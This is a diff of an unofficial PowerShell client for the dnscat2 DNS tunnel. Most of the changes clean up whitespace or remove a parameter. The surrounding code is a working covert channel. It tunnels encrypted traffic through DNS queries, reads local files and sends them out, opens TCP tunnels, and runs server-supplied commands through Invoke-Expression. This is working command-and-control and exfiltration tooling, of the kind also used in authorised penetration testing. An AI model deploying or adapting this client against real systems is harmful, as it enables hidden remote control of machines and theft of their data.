@@ -634,7 +634,7 @@ namespace Org.BouncyCastle.Utilities
         {
             return data == null ? null : (byte[])data.Clone();
         }
-        
+
         public static void Fill(
             byte[]	buf,
             byte	b)
@@ -650,7 +650,6 @@ namespace Org.BouncyCastle.Utilities
 
 "@
 Add-type -TypeDefinition $source -Language CSharp
-
 
 $source = @"
 /*
@@ -684,8 +683,8 @@ namespace Logos.Utility.Security.Cryptography
 		{
 			// set legal values
 			LegalBlockSizesValue = new KeySizes[] { new KeySizes(512, 512, 0) };
-			LegalKeySizesValue   = new KeySizes[] { new KeySizes(128, 256, 128) };
-			
+            LegalKeySizesValue   = new KeySizes[] { new KeySizes(128, 256, 128) };
+
 			// set default values
 			BlockSizeValue = 512;
 			KeySizeValue = 256;
@@ -1003,7 +1002,6 @@ namespace Logos.Utility.Security.Cryptography
 	}
 }
 "@
-
 Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop
 
 function Get-SHA3 ($Bytes) {
@@ -1117,7 +1115,7 @@ function Get-NextDnscat2Data ($DataQueue, $MaxMSGDataSize) {
     if ($DataQueue.Length -eq 0) {
         return ""
     }
-    
+
     $Data = ""
     $PacketCount = 0
     if ($MaxMSGDataSize % 2 -eq 1) {
@@ -1170,7 +1168,7 @@ function ConvertTo-EncryptedDnscat2Packet ($Packet, $EncryptionKeys) {
     [string]$Packet = $Packet
     $PaddedNonce = [System.BitConverter]::GetBytes([uint64]$EncryptionKeys["nonce"])
     [array]::Reverse($PaddedNonce)
-    
+
     $PacketHeader = Convert-HexToBytes $Packet.Substring(0,10)
     [byte[]]$PacketBody = @()
     if ($Packet.Length -gt 10) {
@@ -1190,11 +1188,11 @@ function ConvertFrom-EncryptedDnscat2Packet ($Packet, $EncryptionKeys) {
     $EncryptedPacketData = (Convert-HexToBytes ($Packet[26..$Packet.Length] -join ""))
     $PacketData = Convert-Salsa20 $EncryptedPacketData $EncryptionKeys["server_write"] $PaddedNonce
     $CorrectSignature = Get-Dnscat2PacketSignature $EncryptionKeys["server_mac"] (Convert-HexToBytes $PacketHeader) $Nonce $EncryptedPacketData
-    
+
     if ((Convert-BytesToHex $CorrectSignature) -ne (Convert-BytesToHex $Signature)) {
         Write-Verbose ("SIGNATURE MISMATCH: Packet " + ($Packet[0..3] -join ''))
     }
-    
+
     return ($PacketHeader + (Convert-BytesToHex $PacketData))
 }
 
@@ -1232,23 +1230,23 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
         if ($result.Contains('Name')) {
             $Done = $True
             [byte[]]$Data = @()
-            
+
             # Extract and sort the IPs
             $regex = [regex] "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
             $IPs = ($regex.Matches($result.Substring($result.IndexOf("Name"))) | %{ $_.value }) | sort {"{0:d3}.{1:d3}.{2:d3}.{3:d3}" -f @([int[]]$_.split('.'))}
-            
+
             # First response is different, it has a length field
             $PacketLength = [Convert]::ToUInt16($IPs[0].split(".")[1])
             $IPs[0].split(".")[2..3] | % { $Data += [Convert]::ToUInt16($_) }
             $IPs = $IPs[1..$IPs.Count]
-            
+
             # Strip the sequence numbers out of the other packets
             if ($IPs.Count -gt 0) {
                 foreach ($IP in $IPs) {
                     $IP.split(".")[1..3] | % { $Data += [Convert]::ToUInt16($_) }
                 }
             }
-            
+
             # Return result as hex and strip out the padding
             $result = Convert-BytesToHex $Data[0..($PacketLength - 1)]
         }
@@ -1256,12 +1254,12 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
         if ($result.Contains('Name')) {
             $Done = $True
             $Data = ""
-            
+
             # Extract the IPs
             $regex = [regex] "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"
             $IPs = @()
             $IPs += ($regex.Matches($result.Substring($result.IndexOf("Name"))) | % { if ($_.value -ne "::") {$_.value} } )
-            
+
             # Expand the IPv6 address
             for ($i = 0; $i -lt $IPs.Count; $i++) {
                 [byte[]]$ipbytes = ([Net.IPAddress]$IPs[$i]).GetAddressBytes();
@@ -1272,14 +1270,14 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
                 $bldr.Length = $bldr.Length-1
                 $IPs[$i] = $bldr.ToString()
             }
-            
+
             # Sort
             $IPs = $IPs | sort
-            
+
             # First response is different, it has a length field
             $PacketLength = [Convert]::ToUInt16($IPs[0].Substring(2,2),16)
             $Data += $IPs[0].replace(":","").Substring(4) # Strip length and seq from start
-            
+
             # Grab data from responses after the first
             $IPs = $IPs[1..$IPs.Count]
             if ($IPs.Count -gt 0) {
@@ -1287,12 +1285,12 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
                     $Data += $IP.replace(":","").Substring(2) # Strip seq from start
                 }
             }
-            
+
             # Return result as hex and strip out the padding
             $result = $Data.Substring(0, $PacketLength*2)
         }
     }
-    
+
     if ($Done) {
         if ($Encryption) {
             $DecryptedPacket = [string](ConvertFrom-EncryptedDnscat2Packet $result $EncryptionKeys)
@@ -1300,7 +1298,7 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
         }
         return $result
     }
-    
+
     return 1
 }
 
@@ -1314,8 +1312,7 @@ function ConvertTo-Dnscat2Packet ($RawPacket) {
     $Packet["MessageType"] = ($RawPacket[4..5] -join "")
     $Packet["SessionId"] = ($RawPacket[6..9] -join "")
     $Packet["Data"] = ""
-    
-    $Data = ""
+
     switch ($Packet["MessageType"]) {
         "00" {
             $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
@@ -1365,24 +1362,24 @@ function Start-Dnscat2EncInit ($Session, $Renegotiate) {
     $ECKeyPairGenerator = New-Object Org.BouncyCastle.Crypto.Generators.ECKeyPairGenerator
     $ECKeyPairGenerator.Init((New-Object Org.BouncyCastle.Crypto.KeyGenerationParameters((New-Object Org.BouncyCastle.Security.SecureRandom), 256)))
     $ECKeyPair = $ECKeyPairGenerator.GenerateKeyPair()
-    
+
     $Session["EncryptionKeys"]["keypair"] = $ECKeyPair
     $Session["EncryptionKeys"]["client_privkey"] = (Convert-BytesToHex $ECKeyPair.Private.D.ToByteArrayUnsigned())
     $Session["EncryptionKeys"]["client_pubkey"] = (Convert-BytesToHex $ECKeyPair.Public.Q.X.ToBigInteger().ToByteArrayUnsigned()) + (Convert-BytesToHex $ECKeyPair.Public.Q.Y.ToBigInteger().ToByteArrayUnsigned())
     $Session["EncryptionKeys"]["client_pubkey_x"] = (Convert-BytesToHex $ECKeyPair.Public.Q.X.ToBigInteger().ToByteArrayUnsigned())
     $Session["EncryptionKeys"]["client_pubkey_y"] = (Convert-BytesToHex $ECKeyPair.Public.Q.Y.ToBigInteger().ToByteArrayUnsigned())
-    
+
     $Subtype = "0000" # ENC_SUBTYPE_INIT
     $Flags = "0000"
     Write-Verbose ("client_pubkey: " + ($Session["EncryptionKeys"]["client_pubkey"]))
     $EncPacket = (New-Dnscat2ENC $Session["Domain"] $Session["SessionId"] $Subtype $Flags $Session["EncryptionKeys"]["client_pubkey"] $Session["MaxMSGDataSize"])
-    
+
     try {
         $Packet = 1
         # If we are renegotiating, encrypt the packet
         $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $EncPacket $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $Renegotiate $OldEncryptionKeys)
     } catch {}
-    
+
     if ($Packet -eq 1) {
         Write-Error "Failed to negotiate encryption. Ensure your dnscat2 server is set up correctly."
         return 1
@@ -1401,16 +1398,16 @@ function Start-Dnscat2EncInit ($Session, $Renegotiate) {
     $Session["EncryptionKeys"]["server_write"] = Get-SHA3 ($Session["EncryptionKeys"]["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("server_write_key")))
     $Session["EncryptionKeys"]["server_mac"] = Get-SHA3 ($Session["EncryptionKeys"]["shared_secret"] + ([System.Text.Encoding]::ASCII.GetBytes("server_mac_key")))
     $Session["Negotiated"] = $True
-    
+
     return $Session
 }
 
 function Start-Dnscat2EncAuth ($Session) {
     $Subtype = "0001" # ENC_SUBTYPE_AUTH
     $Flags = "0001"
-    
+
     $EncPacket = (New-Dnscat2ENC $Session["Domain"] $Session["SessionId"] $Subtype $Flags (Get-NextDnscat2Data (Convert-BytesToHex $Session["EncryptionKeys"]["client_auth"]) $Session["MaxMSGDataSize"]))
-    
+
     try {
         $Packet = 1
         $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $EncPacket $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $False $null)
@@ -1419,14 +1416,14 @@ function Start-Dnscat2EncAuth ($Session) {
         Write-Error "Failed to negotiate encryption. Ensure your dnscat2 server is set up correctly."
         return 1
     }
-    
+
     if ($Packet["authenticator"] -eq (Convert-BytesToHex $Session["EncryptionKeys"]["server_auth"])) {
         Write-Verbose "SESSION AUTHENTICATED"
     } else {
         Write-Error "MITM WARNING: Server responded with an incorrect PreSharedSecret!"
         return 1
     }
-    
+
     return $Session
 }
 
@@ -1446,7 +1443,7 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
     $Session["MaxRandomDelay"] = $MaxRandomDelay
     $Session["LookupTypes"] = $LookupTypes
     $Session["SYNOptions"] = $Options
-    
+
     $Session["PSCommandReady"] = $False
     $Session["PSCommand"] = ""
     $Session["PSUploadReady"] = $False
@@ -1455,7 +1452,7 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
     $Session["PSDownloadReady"] = $False
     $Session["PSDownloadPacketIdBF"] = ""
     $Session["PSDownloadName"] = ""
-    
+
     $Session["Encryption"] = $Encryption
     $Session["Negotiated"] = $False
     $Session["EncryptionKeys"] = New-Object System.Collections.Hashtable
@@ -1466,7 +1463,7 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
         if ($Session -eq 1) {
             return 1
         }
-        
+
         if ($PreSharedSecret -ne "") {
             $Session = Start-Dnscat2EncAuth $Session
             if ($Session -eq 1) {
@@ -1474,19 +1471,19 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
             }
         }
     }
-    
+
     $SYNPacket = (New-Dnscat2SYN $Domain $SessionId $Session["SequenceNumber"] $Options)
     $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $SYNPacket $Domain $DNSServer $DNSPort $LookupTypes $Session["Encryption"] $Session["EncryptionKeys"])
-    
+
     if ($Packet -eq 1) {
         Write-Error "Failed to start session. Ensure your dnscat2 server is set up correctly."
         return 1
     }
 
-    
+
     $Session["DriverDataQueue"] = $Packet["Data"]
     $Session["AcknowledgementNumber"] = $Packet["AcknowledgementNumber"]
-    
+
     if($Driver -eq "console") {
     } elseif ($Driver -eq "command") {
         $Session["RemainingBytes"] = 0
@@ -1523,7 +1520,7 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
         Write-Error "Domain name is too long."
         return 1
     }
-    
+
     return $Session
 }
 
@@ -1553,7 +1550,7 @@ function New-Dnscat2Tunnel ($Session, $TunnelId) {
         }
         Sleep -Milliseconds 100
     }
-    
+
     $Session["Tunnels"][$TunnelId].Add("Stream", $Stream)
     $Session["Tunnels"][$TunnelId].Add("Socket", $Socket)
     $Session["Tunnels"][$TunnelId].Add("BufferSize", $BufferSize)
@@ -1561,7 +1558,7 @@ function New-Dnscat2Tunnel ($Session, $TunnelId) {
     $Session["Tunnels"][$TunnelId].Add("StreamReadOperation", $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null))
     $Session["Tunnels"][$TunnelId].Add("StreamBytesRead", 1)
     $Session["Tunnels"][$TunnelId].Add("Dead", $False)
-    
+
     return $Session
 }
 
@@ -1637,7 +1634,7 @@ function Update-Dnscat2CommandSession ($Session) {
                 $Session["RemainingBytes"] -= ($Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)).Length/2
                 $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring($RemainingBytes)
             }
-            
+
             if ($Session["RemainingBytes"] -eq 0) { # If we've completed a packet, lets send it right now
                 break
             }
@@ -1647,7 +1644,7 @@ function Update-Dnscat2CommandSession ($Session) {
             break
         }
     }
-    
+
     ## INVOKE COMMAND PACKET
     if ($Session["RemainingBytes"] -eq 0) {
         switch ($Session["CommandId"])
@@ -1683,12 +1680,12 @@ function Update-Dnscat2CommandSession ($Session) {
                     $NewSessionName = $Session["CommandFields"].Substring(0,$Session["CommandFields"].IndexOf("00"))
                     $NewSessionCommand = Convert-HexToString ($Session["CommandFields"].Substring($Session["CommandFields"].IndexOf("00") + 2).replace("00",""))
                     $NewSessionDriver = "exec"
-                    
+
                     if ($NewSessionCommand -eq "psh") {
                         $NewSessionDriver = "PS"
                         $NewSessionCommand = ""
                     }
-                    
+
                     $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $Session.MaxRandomDelay $NewSessionDriver $NewSessionCommand
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
@@ -1707,7 +1704,7 @@ function Update-Dnscat2CommandSession ($Session) {
             {
                 try {
                     $FileName = Convert-HexToString $Session["CommandFields"].TrimEnd('00')
-                    
+
                     if ($FileName.StartsWith("bytes:`$")) {
                         $Session["PSDownloadReady"] = $True
                         $Session["PSDownloadName"] = $FileName.Substring(7)
@@ -1715,7 +1712,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     } else {
                         $FileHexDump = Convert-BytesToHex ([IO.File]::ReadAllBytes($FileName))
                         $PacketLengthField = ([Convert]::ToString((4 + ($FileHexDump.Length/2)),16)).PadLeft(8, '0')
-                        $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)                    
+                        $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
                         $Session["DriverDataQueue"] += $DriverData
                     }
                     $DriverData = ("00000004" + $Session.PacketIdBF + $Session["CommandId"])
@@ -1734,7 +1731,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Data = $Session["CommandFields"]
                     $FileName = Convert-HexToString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                     [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')
-                    
+
                     if ($FileName.StartsWith("hex:`$")) {
                         $Session["PSUploadReady"] = $True
                         $Session["PSUploadName"] = $FileName.Substring(5)
@@ -1759,7 +1756,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Session["Delay"] = [Convert]::ToUInt32($Session["CommandFields"], 16)
                     Write-Verbose ('New Delay: ' + $Session["Delay"].ToString())
                 } catch {}
-                
+
             }
             "1000" # TUNNEL_CONNECT
             {
@@ -1769,7 +1766,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Tunnel.Add("Port", [Convert]::ToUInt16($Session["CommandFields"].Substring($Session["CommandFields"].Length - 4), 16))
                     $Tunnel.Add("TunnelId", (New-RandomDNSField 8))
                     $Session["Tunnels"].Add($Tunnel.TunnelId, $Tunnel)
-                    
+
                     ## START UP TUNNEL
                     $Session = New-Dnscat2Tunnel $Session $Tunnel.TunnelId
 
@@ -1780,7 +1777,7 @@ function Update-Dnscat2CommandSession ($Session) {
                         $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
                         $Session["DriverDataQueue"] += $DriverData
                     }
-                    
+
                     $DriverData = ("00000008" + $Session.PacketIdBF + "1000" + $Tunnel.TunnelId)
                     $Session["DriverDataQueue"] += $DriverData
                 } catch {
@@ -1795,7 +1792,7 @@ function Update-Dnscat2CommandSession ($Session) {
             {
                 try {
                     $TunnelId = $Session["CommandFields"].Substring(0, 8)
-                    $Data = $Session["CommandFields"].Substring(8)                
+                    $Data = $Session["CommandFields"].Substring(8)
                     $Session = Send-ToDnscat2Tunnel $Session $TunnelId $Data
                 } catch { }
             }
@@ -1808,7 +1805,7 @@ function Update-Dnscat2CommandSession ($Session) {
             }
         }
     }
-    
+
     return $Session
 }
 
@@ -1821,7 +1818,7 @@ function Read-DataFromDriver ($Session) {
         $Session["DriverDataQueue"] += (Convert-StringToHex $Data)
         return $Session
     } elseif ($Session["Driver"] -eq "command") {
-    
+
         # Tunnels are the only time a command session sends data without a prior request
         if ($Session["Tunnels"].Count -gt 0) {
             # Update Tunnels
@@ -1829,19 +1826,19 @@ function Read-DataFromDriver ($Session) {
             $TunnelIds += $Session["Tunnels"].Keys
             foreach ($TunnelId in $TunnelIds) {
                 $Session = Read-FromDnscat2Tunnel $Session $TunnelId
-                
+
                 if ($Session[$TunnelId].Dead) {
                     $Session["DeadTunnels"] += $TunnelId
                 }
             }
-            
+
             # Remove Dead Tunnels
             foreach ($TunnelId in $Session["DeadTunnels"]) {
                 $Session["Tunnels"].Remove($TunnelId)
             }
             $Session["DeadTunnels"] = @()
         }
-        
+
     } elseif ($Session["Driver"] -eq "exec") {
         if($Host.UI.RawUI.KeyAvailable) {
             $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
@@ -1894,7 +1891,7 @@ function Update-Dnscat2Session ($Session) {
     try {
         # Retrive Driver Data
         $Session = Read-DataFromDriver $Session
-        
+
         if ($Session["Encryption"]) {
             $Session["EncryptionKeys"]["nonce"] += 1
             if ($Session["EncryptionKeys"]["nonce"] -gt 65500) {
@@ -1902,20 +1899,20 @@ function Update-Dnscat2Session ($Session) {
                 $Session = Start-Dnscat2EncInit $Session $True
             }
         }
-        
+
         if ($Session.Dead) {
             $Session = Stop-Dnscat2Session $Session
             return $Session
         }
-        
+
         # Grab next data in the queue
         $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
-        
+
         # Delay
         $RandomDelay = $Session['MaxRandomDelay']
         if ($Session['MaxRandomDelay'] -le 0) { $RandomDelay = 0 }
         Sleep -Milliseconds ($Session['Delay'] + $RandomDelay)
-        
+
         try {
             $MSGPACKET = (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData)
             $Packet = (Send-Dnscat2Packet $MSGPACKET $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $Session["Encryption"] $Session["EncryptionKeys"])
@@ -1924,7 +1921,7 @@ function Update-Dnscat2Session ($Session) {
 			$Session.Dead = $True
             return $Session
         }
-        
+
         try {
             $Packet = (ConvertTo-Dnscat2Packet $Packet)
             if($Packet -eq 1){ Write-Error "Dnscat2: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
@@ -1936,7 +1933,7 @@ function Update-Dnscat2Session ($Session) {
                     $Session["DriverDataQueue"] = ($Session["DriverDataQueue"]).Substring($BytesACKed*2)
                 }
                 $Session["SequenceNumber"] = $Packet["AcknowledgementNumber"]
-                
+
                 # ACK the server data
                 if ($Packet["Data"] -ne "") {
                     $Session["AcknowledgementNumber"] = Update-Dnscat2ACK $Packet["Data"] $Packet["SequenceNumber"]
@@ -1948,10 +1945,10 @@ function Update-Dnscat2Session ($Session) {
             }
         } catch {
             Write-Error "Dnscat2: Caught error while processing packet, dropping..."
-			$Session.Dead = $True 
+			$Session.Dead = $True
 			$Session = Stop-Dnscat2Session $Session
         }
-        
+
         if ($Session.Driver -eq "command") {
             $Session = Update-Dnscat2CommandSession $Session
         }
@@ -1965,62 +1962,58 @@ function Update-Dnscat2Session ($Session) {
 function Start-Dnscat2 {
     <#
     .SYNOPSIS
-        Start a Dnscat2 session.
+        Start a Dnscat2 session. By default, a command type session is created.
 
     .DESCRIPTION
         This powershell script is an unofficial client for the dnscat2 DNS tunnel.
 
     .PARAMETER Domain
         The Domain being used by the dnscat2 server.
-    
+
     .PARAMETER DNSServer
         The hostname or IP Address to send DNS queries to.
 
     .PARAMETER DNSPort
         The port to send DNS queries to.
 
-    .PARAMETER Command
-        Start a command session. (Default)
-		
     .PARAMETER Exec
         Link the I/O of a process with the Dnscat2 session.
-    
+
     .PARAMETER Console
         Link the I/O of the console with the Dnscat2 session.
 
     .PARAMETER ExecPS
         Simulate a Powershell session and link the IO with the Dnscat2 session.
         WARNING: Exiting will kill the entire dnscat2 client, not just the session.
-    
+
     .PARAMETER PreSharedSecret
         Set the shared secret. Set the same one on the server and the client to prevent man-in-the-middle attacks!
-        
+
     .PARAMETER NoEncryption
         Do not enable encryption.
-    
+
     .PARAMETER LookupTypes
         Set an array of lookup types. Each packet has its lookup type randomly selected from the array.
         Only TXT, MX, CNAME, A, and AAAA records are supported. Default: @(TXT, MX, CNAME)
-    
+
     .PARAMETER Delay
         Set a delay between each request, in milliseconds. (Default: 0)
-        
+
     .PARAMETER MaxRandomDelay
         Set the max value of a random delay added to the normal delay, in milliseconds. (Default: 0)
-    
+
     .PARAMETER MaxPacketSize
         Maximum length of a dnscat2 packet.
-        
+
     .PARAMETER Name
         The name of your dnscat2 session. (Default: hostname)
     #>
-    
+
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True)][Alias("d")][string]$Domain,
         [Alias("s")][string]$DNSServer="",
         [Alias("p")][ValidateRange(1,65535)][int32]$DNSPort=53,
-		[switch]$Command=$True,
         [Alias("e")][string]$Exec="",
         [switch]$Console=$False,
         [Alias("psh")][switch]$ExecPS=$False,
@@ -2032,7 +2025,7 @@ function Start-Dnscat2 {
         [ValidateRange(1,240)][int32]$MaxPacketSize=240,
         [Alias("n")][string]$Name=""
     )
-	
+
     if ($DNSServer -eq "") {
         Write-Verbose "No DNS Server specified! Checking DNS settings..."
         $DNSServers = @()
@@ -2045,7 +2038,7 @@ function Start-Dnscat2 {
         $DNSServer = $DNSServers[0]
         Write-Verbose ("DNSServer set to " + $DNSServer)
     }
-    
+
     foreach ($LookupType in $LookupTypes) {
         if (!(@("TXT","MX","CNAME","A","AAAA") -contains $LookupType)) {
             Write-Error ($LookupType + " is not a valid Lookup Type!")
@@ -2053,9 +2046,9 @@ function Start-Dnscat2 {
             return
         }
     }
-    
+
     $SYNOptions = 1 # Enable OPT_NAME to name the session
-    
+
     if ($Exec -ne '') {
         $Driver = 'exec'
         $DriverOptions = $Exec
@@ -2070,18 +2063,18 @@ function Start-Dnscat2 {
 		$DriverOptions = ''
         $SYNOptions += 0x20
 	}
-    
+
     if (!$NoEncryption) {
         #$SYNOptions += 0x40
     }
-    
+
     $SYNOptions = [Convert]::ToString($SYNOptions, 16).PadLeft(4, '0')
-    
+
     if ($Name -eq '') {
         $Name = $Driver + ' (' + (hostname) + ')'
     }
     $SYNOptions += (Convert-StringToHex $Name) + '00'
-    
+
     $Sessions = New-Object System.Collections.Hashtable
     $DeadSessions = @()
     $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize (-not $NoEncryption) $PreSharedSecret $LookupTypes $Delay $MaxRandomDelay $Driver $DriverOptions
@@ -2089,7 +2082,7 @@ function Start-Dnscat2 {
         return
     }
     $Sessions.Add($InitialSession["SessionId"], $InitialSession)
-    
+
     try {
         while ($Sessions.Count -gt 0) {
             # Remove Dead Sessions
@@ -2103,14 +2096,14 @@ function Start-Dnscat2 {
             $SessionIds += $Sessions.Keys
             foreach ($SessionId in $SessionIds) {
                 $Sessions[$SessionId] = Update-Dnscat2Session $Sessions[$SessionId]
-                
+
                 # Execute PS commands here for access to full scope
                 if ($Sessions[$SessionId]["PSCommandReady"]) {
                     try { $Sessions[$SessionId]["DriverDataQueue"] += (Convert-StringToHex (Invoke-Expression (Convert-HexToString $Sessions[$SessionId]["PSCommand"]) | Out-String)) } catch { }
                     $Sessions[$SessionId]["PSCommand"] = ""
                     $Sessions[$SessionId]["PSCommandReady"] = $False
                 }
-                
+
                 # Execute PS uploads here for access to full scope
                 if ($Sessions[$SessionId]["PSUploadReady"]) {
                     try { Set-Variable -Name $Sessions[$SessionId]["PSUploadName"] -Value $Sessions[$SessionId]["PSUploadValue"] } catch { }
@@ -2118,7 +2111,7 @@ function Start-Dnscat2 {
                     $Sessions[$SessionId]["PSUploadName"] = ""
                     $Sessions[$SessionId]["PSUploadValue"] = ""
                 }
-                
+
                 # Execute PS downloads here for access to full scope
                 if ($Sessions[$SessionId]["PSDownloadReady"]) {
                     try {
@@ -2133,11 +2126,11 @@ function Start-Dnscat2 {
                     $Sessions[$SessionId]["PSDownloadPacketIdBF"] = ""
                     $Sessions[$SessionId]["PSDownloadName"] = ""
                 }
-                
+
                 if ($Sessions[$SessionId].Dead) {
                     $DeadSessions += $SessionId
                 }
-                
+
                 if (($Sessions[$SessionId])["NewSessions"].Count -gt 0) {
                     foreach ($NewSessionId in $Sessions[$SessionId].NewSessions.Keys) {
                         $Sessions.Add($NewSessionId, $Sessions[$SessionId]["NewSessions"][$NewSessionId])
